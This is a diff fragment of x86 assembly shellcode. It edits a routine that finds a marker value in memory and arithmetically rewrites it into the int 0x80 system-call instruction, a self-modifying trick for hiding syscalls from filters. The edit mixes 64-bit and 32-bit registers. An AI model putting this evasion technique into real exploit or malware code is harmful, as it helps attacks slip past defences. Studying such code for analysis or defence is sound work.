@@ -11,11 +11,15 @@ post_locate_payload:
 	mov edx, esi		; //
 
 search_egg:
-	mov eax, [edx]
-	cmp word ax, 0x7dca	; search egg
-	jne not_found
-	add ax, 0x0303		; 0x7dca + 0x0303 = 0x80cd (int 0x80)
-	mov [edx], eax		; write instruction -> segfault
+        ;%define system_call int 0x80
+        %define EGG 0x7dca
+        %define SHIFT 0x0303
+        %define system_call dw EGG
+        mov rax, [rdx]
+        cmp word ax, EGG        ; search egg
+        jne not_found
+        add ax, SHIFT           ; 0x7dca + 0x0303 = 0x80cd (int 0x80)
+        mov [rdx], eax          ; rewrite instruction
 
 not_found:
 	inc edx
